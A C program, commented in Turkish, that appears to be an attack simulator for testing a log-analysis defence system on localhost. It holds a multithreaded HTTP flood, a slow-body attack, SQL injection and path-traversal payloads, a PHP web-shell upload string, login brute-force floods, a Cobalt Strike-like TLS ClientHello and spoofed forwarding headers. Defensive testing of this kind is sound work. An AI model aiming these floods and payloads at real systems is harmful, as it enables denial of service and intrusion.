/* tester.c — Asenkron HTTP Load Generator / Saldırı Simülatörü
 *
 * Kullanım:
 *   ./tester --mode ddos    --host 127.0.0.1 --port 80 --rps 1000 --threads 8
 *   ./tester --mode sqli      --host 127.0.0.1 --port 80
 *   ./tester --mode post_sqli --host 127.0.0.1 --port 80
 *   ./tester --mode brute     --host 127.0.0.1 --port 80
 *   ./tester --mode slow      --host 127.0.0.1 --port 80
 *
 * Modlar:
 *   ddos      : N thread, her biri M RPS'te GET / isteği atar.
 *   sqli      : SQLi payload'ları GET URL'ine gömer.
 *   post_sqli : POST body icinde SQLi (nginx $request_body log gerekir).
 *   brute     : wp-login / api/login POST flood.
 *   slow      : Content-Length: 10000 gönderir, body'yi 1 byte/sn yollar.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <stdatomic.h>

#define MAX_THREADS   64
#define EPOLL_EVENTS  256
#define BUF_SIZE      4096

static volatile sig_atomic_t g_running = 1;
static _Atomic long      g_sent     = 0;
static _Atomic long      g_refused  = 0;
static _Atomic long      g_timeout  = 0;
static _Atomic long      g_ok       = 0;

static const char *g_host      = "127.0.0.1";
static int         g_port      = 80;
static int         g_rps       = 200;    /* hedef RPS per thread */
static int         g_threads   = 4;
static const char *g_mode      = "ddos";
static int         g_count     = 10;     /* apt-swarm: kac farkli IP */
static const char *g_payload   = "/../etc/passwd"; /* apt-swarm payload */

/* SQLi payload listesi */
static const char *SQLI_URLS[] = {
    "/login?user=admin%27%20OR%20%271%27%3D%271",
    "/search?q=1%27%20UNION%20SELECT%20NULL%2CNULL--",
    "/admin?id=1%27%3BDROP%20TABLE%20users--",
    "/index.php?page=../../etc/passwd",
    "/api?input=1%27%20AND%20SLEEP(5)--",
    "/upload?file=shell.php%3C%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%3F%3E",
};
static const int SQLI_URL_COUNT = (int)(sizeof(SQLI_URLS)/sizeof(SQLI_URLS[0]));

static const char *POST_PATHS[] = {
    "/api/login",
    "/api/v1/auth/login",
    "/wp-login.php",
    "/login",
    "/giris",
    "/account/login",
};
static const char *POST_BODIES[] = {
    "username=admin%27+OR+1%3D1--&password=x",
    "user=admin&pass=%27+OR+%271%27%3D%271",
    "log=admin%27--&pwd=test&wp-submit=Log+In",
    "email=test%40x.com%27+UNION+SELECT+1--&password=y",
    "client_id=1%27+OR+1%3D1--&grant_type=password",
    "username=root&password=%27+OR+1%3D1--",
};
static const int POST_PATH_COUNT  = (int)(sizeof(POST_PATHS)/sizeof(POST_PATHS[0]));
static const int POST_BODY_COUNT  = (int)(sizeof(POST_BODIES)/sizeof(POST_BODIES[0]));

static const char *BRUTE_PATHS[] = {
    "/wp-login.php",
    "/api/login",
    "/login",
    "/giris",
};
static const int BRUTE_PATH_COUNT = (int)(sizeof(BRUTE_PATHS)/sizeof(BRUTE_PATHS[0]));

static void handle_sigint(int sig) {
    g_running = 0;
    /* timeout(1) SIGTERM sonrasi process'in hemen cikmasi gerekir */
    _exit(128 + sig);
}

static void irq_usleep(useconds_t usec) {
    while (usec > 0 && g_running) {
        useconds_t chunk = usec > 50000U ? 50000U : usec;
        usleep(chunk);
        usec -= chunk;
    }
}

static int make_nonblock_socket(void) {
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
    if (fd < 0) return -1;
    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    return fd;
}

static int try_connect(const char *host, int port) {
    int fd = make_nonblock_socket();
    if (fd < 0) return -1;

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        close(fd); return -1;
    }

    int rc = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (rc == 0 || errno == EINPROGRESS) return fd;
    close(fd);
    return -1;
}

/* ─── DDOS MODU ────────────────────────────────────────────────── */
typedef struct {
    int thread_id;
} DdosArg;

static void *ddos_thread(void *arg) {
    DdosArg *a = (DdosArg *)arg;
    (void)a;

    struct timespec interval;
    long ns_per_req = (g_rps > 0) ? (1000000000L / g_rps) : 1000000L;
    interval.tv_sec  = 0;
    interval.tv_nsec = ns_per_req;

    char req[512];
    snprintf(req, sizeof(req),
             "GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", g_host);
    size_t req_len = strlen(req);

    while (g_running) {
        int fd = try_connect(g_host, g_port);
        if (fd < 0) {
            if (errno == ECONNREFUSED) {
                atomic_fetch_add(&g_refused, 1);
            } else if (errno == ETIMEDOUT) {
                atomic_fetch_add(&g_timeout, 1);
            }
            nanosleep(&interval, NULL);
            continue;
        }

        /* Bağlantı tamamlanmasını bekle (non-blocking) */
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(fd, &wfds);
        struct timeval tv = {2, 0};
        int sel = select(fd + 1, NULL, &wfds, NULL, &tv);
        if (sel <= 0) {
            atomic_fetch_add(&g_timeout, 1);
            close(fd);
            nanosleep(&interval, NULL);
            continue;
        }

        /* İstek gönder */
        ssize_t w = send(fd, req, req_len, MSG_NOSIGNAL);
        if (w > 0) {
            atomic_fetch_add(&g_sent, 1);
            char rbuf[64];
            recv(fd, rbuf, sizeof(rbuf), 0);
            /* 200 ya da herhangi bir yanıt aldıysak OK */
            atomic_fetch_add(&g_ok, 1);
        }
        close(fd);
        nanosleep(&interval, NULL);
    }
    return NULL;
}

/* ─── SQLi MODU ─────────────────────────────────────────────────── */
static void *sqli_thread(void *arg) {
    (void)arg;
    int url_idx = 0;
    char req[1024];

    while (g_running) {
        const char *url = SQLI_URLS[url_idx % SQLI_URL_COUNT];
        url_idx++;

        snprintf(req, sizeof(req),
                 "GET %s HTTP/1.1\r\nHost: %s\r\n"
                 "User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
                 url, g_host);

        int fd = try_connect(g_host, g_port);
        if (fd < 0) {
            if (errno == ECONNREFUSED) atomic_fetch_add(&g_refused, 1);
            irq_usleep(200000);
            continue;
        }

        fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
        struct timeval tv = {3, 0};
        if (select(fd + 1, NULL, &wfds, NULL, &tv) > 0) {
            send(fd, req, strlen(req), MSG_NOSIGNAL);
            atomic_fetch_add(&g_sent, 1);
            char rbuf[256];
            recv(fd, rbuf, sizeof(rbuf), 0);
            atomic_fetch_add(&g_ok, 1);
        }
        close(fd);
        irq_usleep(100000);
    }
    return NULL;
}

/* ─── POST SQLi MODU ─────────────────────────────────────────────── */
static void *post_sqli_thread(void *arg) {
    (void)arg;
    int idx = 0;
    char req[2048];

    while (g_running) {
        const char *path = POST_PATHS[idx % POST_PATH_COUNT];
        const char *body = POST_BODIES[idx % POST_BODY_COUNT];
        idx++;
        size_t blen = strlen(body);

        snprintf(req, sizeof(req),
                 "POST %s HTTP/1.1\r\nHost: %s\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Content-Length: %zu\r\n"
                 "User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n%s",
                 path, g_host, blen, body);

        int fd = try_connect(g_host, g_port);
        if (fd < 0) {
            if (errno == ECONNREFUSED) atomic_fetch_add(&g_refused, 1);
            else if (errno == ETIMEDOUT) atomic_fetch_add(&g_timeout, 1);
            irq_usleep(150000);
            continue;
        }
        fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
        struct timeval tv = {3, 0};
        if (select(fd + 1, NULL, &wfds, NULL, &tv) > 0) {
            send(fd, req, strlen(req), MSG_NOSIGNAL);
            atomic_fetch_add(&g_sent, 1);
            char rbuf[256];
            recv(fd, rbuf, sizeof(rbuf), 0);
            atomic_fetch_add(&g_ok, 1);
        }
        close(fd);
        irq_usleep(80000);
    }
    return NULL;
}

/* ─── BRUTE LOGIN MODU ───────────────────────────────────────────── */
static void *brute_thread(void *arg) {
    (void)arg;
    int idx = 0;
    char req[1024];

    while (g_running) {
        const char *path = BRUTE_PATHS[idx % BRUTE_PATH_COUNT];
        idx++;
        const char *body = "user=admin&pass=wrong123";
        size_t blen = strlen(body);

        snprintf(req, sizeof(req),
                 "POST %s HTTP/1.1\r\nHost: %s\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Content-Length: %zu\r\n"
                 "User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n%s",
                 path, g_host, blen, body);

        int fd = try_connect(g_host, g_port);
        if (fd < 0) {
            if (errno == ECONNREFUSED) atomic_fetch_add(&g_refused, 1);
            irq_usleep(50000);
            continue;
        }
        fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
        struct timeval tv = {2, 0};
        if (select(fd + 1, NULL, &wfds, NULL, &tv) > 0) {
            send(fd, req, strlen(req), MSG_NOSIGNAL);
            atomic_fetch_add(&g_sent, 1);
            char rbuf[128];
            recv(fd, rbuf, sizeof(rbuf), 0);
            atomic_fetch_add(&g_ok, 1);
        }
        close(fd);
        irq_usleep(30000);
    }
    return NULL;
}

/* ─── LOW & SLOW MODU ───────────────────────────────────────────── */
static void *slow_thread(void *arg) {
    (void)arg;

    while (g_running) {
        int fd = try_connect(g_host, g_port);
        if (fd < 0) {
            if (errno == ECONNREFUSED) {
                atomic_fetch_add(&g_refused, 1);
                fprintf(stderr, "✅ BAN aktif! ECONNREFUSED alindi.\n");
            }
            sleep(2);
            continue;
        }

        /* Büyük Content-Length bildir, body'yi 1 byte/sn gönder */
        const char *headers =
            "POST /upload HTTP/1.1\r\n"
            "Host: target\r\n"
            "Content-Length: 100000\r\n"
            "Content-Type: application/octet-stream\r\n"
            "\r\n";

        fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
        struct timeval tv = {3, 0};
        if (select(fd + 1, NULL, &wfds, NULL, &tv) <= 0) {
            close(fd); continue;
        }

        send(fd, headers, strlen(headers), MSG_NOSIGNAL);
        atomic_fetch_add(&g_sent, 1);
        fprintf(stderr, "[SLOW] Baglanildi. Body 1 byte/sn gonderiliyor...\n");

        for (int i = 0; i < 60 && g_running; i++) {
            char byte = 'A';
            ssize_t w = send(fd, &byte, 1, MSG_NOSIGNAL);
            if (w < 0) {
                fprintf(stderr, "✅ BAN! Baglanti kesildi (%s)\n", strerror(errno));
                break;
            }
            sleep(1);
        }
        close(fd);
    }
    return NULL;
}

/* ─── JA3-TEST MODU: Ham TLS ClientHello gonder ─────────────────
 *
 * Cobalt Strike varsayilan JA3 hash'ini ureten minimal bir TLS
 * ClientHello el sikismasi olusturur. Analizor bu paketi XDP ring
 * buffer uzerinden alip ja3_engine ile eslestirir; ALERT_CRIT uretmeli.
 */
static void run_ja3_test(void) {
    fprintf(stderr, "[JA3-TEST] Port %d'e raw TLS ClientHello gonderiliyor...\n", g_port);

    /* TLS 1.2 ClientHello — Cobalt Strike default cipher suite listesi */
    static const uint8_t CLIENT_HELLO[] = {
        /* TLS Record */
        0x16,             /* Content-Type: Handshake */
        0x03, 0x01,       /* Legacy version: TLS 1.0 */
        0x00, 0xdc,       /* Record length (220) */
        /* Handshake */
        0x01,             /* HandshakeType: ClientHello */
        0x00, 0x00, 0xd8, /* Handshake length */
        /* ClientHello */
        0x03, 0x03,       /* Client version: TLS 1.2 */
        /* Random (32 bytes) */
        0x5b,0x85,0x35,0x0c,0x00,0x00,0x00,0x00,
        0x73,0x1a,0x80,0x01,0x6d,0x70,0x72,0x6f,
        0x78,0x79,0x2e,0x65,0x78,0x61,0x6d,0x70,
        0x6c,0x65,0x2e,0x63,0x6f,0x6d,0x00,0x00,
        0x00,             /* Session ID length */
        /* Cipher Suites — Cobalt Strike default set */
        0x00,0x1e,        /* length = 30 bytes (15 suites) */
        0xc0,0x2b, 0xc0,0x2f, 0xcc,0xa9, 0xcc,0xa8,
        0xc0,0x2c, 0xc0,0x30, 0xc0,0x0a, 0xc0,0x09,
        0xc0,0x13, 0xc0,0x14, 0x00,0x33, 0x00,0x39,
        0x00,0x2f, 0x00,0x35, 0x00,0x0a,
        /* Compression Methods */
        0x01, 0x00,
        /* Extensions length */
        0x00,0x91,
        /* Extension: SNI (0x0000) */
        0x00,0x00, 0x00,0x18,
        0x00,0x16, 0x00, 0x00,0x13,
        'e','x','a','m','p','l','e','.','c','o','b',
        'a','l','t','s','t','r','i','k','e','.','c',
        /* Extension: supported_groups (0x000a) */
        0x00,0x0a, 0x00,0x08, 0x00,0x06,
        0x00,0x1d, 0x00,0x17, 0x00,0x18,
        /* Extension: ec_point_formats (0x000b) */
        0x00,0x0b, 0x00,0x02, 0x01, 0x00,
        /* Extension: signature_algorithms (0x000d) */
        0x00,0x0d, 0x00,0x1a, 0x00,0x18,
        0x08,0x04, 0x08,0x05, 0x08,0x06,
        0x04,0x01, 0x05,0x01, 0x06,0x01,
        0x04,0x03, 0x05,0x03, 0x06,0x03,
        0x02,0x01, 0x02,0x03,
        /* Extension: renegotiation_info (0xff01) */
        0xff,0x01, 0x00,0x01, 0x00,
        /* Extension: ALPN (0x0010) */
        0x00,0x10, 0x00,0x0e, 0x00,0x0c,
        0x02,'h','2',
        0x08,'h','t','t','p','/','1','.','1',
        /* Extension: extended_master_secret (0x0017) */
        0x00,0x17, 0x00,0x00
    };

    int fd = try_connect(g_host, g_port);
    if (fd < 0) {
        fprintf(stderr, "[JA3-TEST] Baglanti kurulamadi: %s:%d (%s)\n",
                g_host, g_port, strerror(errno));
        return;
    }
    fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
    struct timeval tv = {3, 0};
    if (select(fd+1, NULL, &wfds, NULL, &tv) > 0) {
        send(fd, CLIENT_HELLO, sizeof(CLIENT_HELLO), MSG_NOSIGNAL);
        atomic_fetch_add(&g_sent, 1);
        fprintf(stderr, "[JA3-TEST] ClientHello gonderildi (%zu byte). "
                        "Analizor loglari kontrol edin.\n",
                sizeof(CLIENT_HELLO));
        char rbuf[256];
        recv(fd, rbuf, sizeof(rbuf), 0);
        atomic_fetch_add(&g_ok, 1);
    } else {
        fprintf(stderr, "[JA3-TEST] Baglanti zaman asimi.\n");
    }
    close(fd);
    fprintf(stderr, "[JA3-TEST] Beklenen: ALERT_CRIT 'JA3 C2 PARMAK IZI — Cobalt Strike'\n");
}

/* ─── APT-SWARM MODU: N farkli IP'den ayni payload ──────────────
 *
 * g_count kadar gorsel olarak farkli kaynak IP'den (her biri farkli
 * bir baglantida) g_payload'u gonderir. Analizor APT Graph motorunda
 * kume olusturarak ALERT_CRIT uretmeli.
 *
 * NOT: Gercek kaynak IP degistirmek root + raw socket gerektirir.
 * Burada her baglanti farkli bir User-Agent ve X-Forwarded-For
 * basligi ile simule edilir; analizor bu basliklari isleyiyorsa
 * test gecerlidir.
 */
static void run_apt_swarm(void) {
    fprintf(stderr, "[APT-SWARM] %d farkli IP simulasyonu, payload: %s\n",
            g_count, g_payload);

    for (int i = 0; i < g_count && g_running; i++) {
        /* Simule edilmis kaynak IP: 10.0.swarm_group.i */
        char fake_ip[32];
        snprintf(fake_ip, sizeof(fake_ip), "10.99.%d.%d", i / 256, i % 256);

        char req[1024];
        snprintf(req, sizeof(req),
                 "GET %s HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "X-Forwarded-For: %s\r\n"
                 "X-Real-IP: %s\r\n"
                 "User-Agent: APT-Swarm-Node/%d\r\n"
                 "Connection: close\r\n\r\n",
                 g_payload, g_host, fake_ip, fake_ip, i);

        int fd = try_connect(g_host, g_port);
        if (fd < 0) {
            fprintf(stderr, "[APT-SWARM] Node %d baglanti hatasi\n", i);
            usleep(100000);
            continue;
        }
        fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
        struct timeval tv = {2, 0};
        if (select(fd+1, NULL, &wfds, NULL, &tv) > 0) {
            send(fd, req, strlen(req), MSG_NOSIGNAL);
            atomic_fetch_add(&g_sent, 1);
            char rbuf[128]; recv(fd, rbuf, sizeof(rbuf), 0);
            atomic_fetch_add(&g_ok, 1);
            fprintf(stderr, "[APT-SWARM] Node %d/%d  IP=%s  gonderildi\n",
                    i+1, g_count, fake_ip);
        }
        close(fd);
        usleep(200000); /* 200ms aralik — senkron pencere icinde */
    }
    fprintf(stderr, "[APT-SWARM] Beklenen: 'DAGITIK APT KUMESI' alarmi\n");
}

/* ─── COOKIE-ENTROPY MODU: Yuksek entropi Cookie header ─────────
 *
 * Shannon entropisi > 5.5 olan rastgele binary benzeri bir cookie
 * degeri gonderir. Covert channel motoru ALERT_WARN uretmeli.
 */
static void run_cookie_entropy(void) {
    fprintf(stderr, "[COOKIE-ENTROPY] Yuksek entropi Cookie header gonderiliyor...\n");

    /* Yuksek entropi: rastgele gorunen Base64+binary karisimi */
    static const char HIGH_ENTROPY_COOKIE[] =
        "session=aB3kR9mN2vQ8wL5rJ7tYuI0sE4hFgDaZbCwXnOiMlKjH1yGpVdRqTsU6fBe"
        "eZ7pL8kN3mR5wJ9tYxI2sE1hFbDaCvXmOiLlJjG4yHpUdQqSsT7fAeCvXmOi";

    char req[1024];
    snprintf(req, sizeof(req),
             "GET / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Cookie: %s\r\n"
             "ETag: W/\"aB3kR9mN2vQ8wL5rJ7tYuI0sE4hFgDaZb\"\r\n"
             "User-Agent: Mozilla/5.0\r\n"
             "Connection: close\r\n\r\n",
             g_host, HIGH_ENTROPY_COOKIE);

    int fd = try_connect(g_host, g_port);
    if (fd < 0) {
        fprintf(stderr, "[COOKIE-ENTROPY] Baglanti kurulamadi (%s)\n", strerror(errno));
        return;
    }
    fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
    struct timeval tv = {3, 0};
    if (select(fd+1, NULL, &wfds, NULL, &tv) > 0) {
        send(fd, req, strlen(req), MSG_NOSIGNAL);
        atomic_fetch_add(&g_sent, 1);
        fprintf(stderr, "[COOKIE-ENTROPY] Istek gonderildi.\n");
        fprintf(stderr, "  Cookie uzunlugu : %zu karakter\n",
                strlen(HIGH_ENTROPY_COOKIE));
        fprintf(stderr, "  Beklenen        : 'COVERT CHANNEL — COOKIE/ETAG ENTROPI'\n");
        char rbuf[256]; recv(fd, rbuf, sizeof(rbuf), 0);
        atomic_fetch_add(&g_ok, 1);
    }
    close(fd);
}

/* ─── İSTATİSTİK YAZDIRICI ─────────────────────────────────────── */
static void *stats_thread(void *arg) {
    (void)arg;
    while (g_running) {
        sleep(2);
        long sent    = atomic_load(&g_sent);
        long refused = atomic_load(&g_refused);
        long tout    = atomic_load(&g_timeout);
        fprintf(stderr,
                "\r[TESTER] Gonderilen: %ld  OK: %ld  REFUSED: %ld  TIMEOUT: %ld   ",
                sent, atomic_load(&g_ok), refused, tout);
        if (refused > 0 || tout > 0) {
            fprintf(stderr, "\n✅ SAVUNMA AKTİF! IP banlandi.\n");
        }
        fflush(stderr);
    }
    return NULL;
}

static void print_usage(const char *prog) {
    fprintf(stderr,
            "Kullanim: %s [--mode MODE] [--host IP] [--port N]\n"
            "          [--rps N] [--threads N] [--count N] [--payload STR]\n"
            "\n"
            "  Temel Modlar:\n"
            "  --mode ddos           : Yuksek hacimli GET flood (varsayilan)\n"
            "  --mode sqli           : SQL injection payload saldirisi (GET)\n"
            "  --mode post_sqli      : SQL injection POST body\n"
            "  --mode brute          : Login endpoint POST flood\n"
            "  --mode slow           : Low & Slow (1 byte/sn body gonderimi)\n"
            "\n"
            "  Intelligence Test Modlari:\n"
            "  --mode ja3-test       : Cobalt Strike JA3 ClientHello gonderir\n"
            "  --mode apt-swarm      : N farkli IP'den ayni payload (APT sim.)\n"
            "  --mode cookie-entropy : Yuksek entropi Cookie/ETag gonderir\n"
            "\n"
            "  Secenekler:\n"
            "  --host IP      : Hedef sunucu IP (varsayilan: 127.0.0.1)\n"
            "  --port N       : Hedef port (varsayilan: 80)\n"
            "  --rps N        : Thread basina RPS (DDoS modu, varsayilan: 200)\n"
            "  --threads N    : Thread sayisi (varsayilan: 4)\n"
            "  --count N      : APT-Swarm: simulasyon IP sayisi (varsayilan: 10)\n"
            "  --payload STR  : APT-Swarm: payload URL yolu\n"
            "\n"
            "  Analizor IP'yi banladiginda ECONNREFUSED veya ETIMEDOUT gorulur.\n"
            "  'BAN aktif!' mesaji ban'in basarili oldugunu onaylar.\n\n",
            prog);
}

int main(int argc, char *argv[]) {
    signal(SIGINT,  handle_sigint);
    signal(SIGTERM, handle_sigint);
    signal(SIGPIPE, SIG_IGN);

    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i], "--host")    && i+1 < argc) g_host    = argv[++i];
        else if (!strcmp(argv[i], "--port")    && i+1 < argc) g_port    = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--rps")     && i+1 < argc) g_rps     = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--threads") && i+1 < argc) g_threads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--mode")    && i+1 < argc) g_mode    = argv[++i];
        else if (!strcmp(argv[i], "--count")   && i+1 < argc) g_count   = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--payload") && i+1 < argc) g_payload = argv[++i];
        else if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
            print_usage(argv[0]); return 0;
        }
    }

    if (g_threads < 1) g_threads = 1;
    if (g_threads > MAX_THREADS) g_threads = MAX_THREADS;

    fprintf(stderr, "🔥 Log Analizor Saldiri Simulatoru\n");
    fprintf(stderr, "   Mod: %s | Hedef: %s:%d | Threads: %d | RPS/thread: %d\n",
            g_mode, g_host, g_port, g_threads, g_rps);
    fprintf(stderr, "   Durdurmak icin Ctrl+C. IP banlandığında REFUSED/TIMEOUT gorulur.\n\n");

    /* ── Intelligence test modlari: dogrudan calistir, thread havuzu kullanma ── */
    if (!strcmp(g_mode, "ja3-test")) {
        run_ja3_test();
        return 0;
    } else if (!strcmp(g_mode, "apt-swarm")) {
        if (g_count < 1) g_count = 10;
        run_apt_swarm();
        return 0;
    } else if (!strcmp(g_mode, "cookie-entropy")) {
        run_cookie_entropy();
        return 0;
    }

    void *(*thread_fn)(void *) = ddos_thread;
    if      (!strcmp(g_mode, "sqli"))      thread_fn = sqli_thread;
    else if (!strcmp(g_mode, "post_sqli")) thread_fn = post_sqli_thread;
    else if (!strcmp(g_mode, "brute"))     thread_fn = brute_thread;
    else if (!strcmp(g_mode, "slow"))      { g_threads = 1; thread_fn = slow_thread; }

    pthread_t workers[MAX_THREADS];
    DdosArg   args[MAX_THREADS];
    for (int i = 0; i < g_threads; i++) {
        args[i].thread_id = i;
        pthread_create(&workers[i], NULL, thread_fn, &args[i]);
    }

    pthread_t stat_tid;
    pthread_create(&stat_tid, NULL, stats_thread, NULL);

    for (int i = 0; i < g_threads; i++)
        pthread_join(workers[i], NULL);
    g_running = 0;
    pthread_join(stat_tid, NULL);

    fprintf(stderr, "\n\n[TESTER] Bitti.\n");
    fprintf(stderr, "  Toplam istek : %ld\n", atomic_load(&g_sent));
    fprintf(stderr, "  Basarili     : %ld\n", atomic_load(&g_ok));
    fprintf(stderr, "  REFUSED (BAN): %ld\n", atomic_load(&g_refused));
    fprintf(stderr, "  TIMEOUT      : %ld\n", atomic_load(&g_timeout));

    long refused = atomic_load(&g_refused);
    if (refused > 0)
        fprintf(stderr, "\n✅ SAVUNMA DOGRULANDI: %ld baglanti ban nedeniyle reddedildi.\n", refused);

    return 0;
}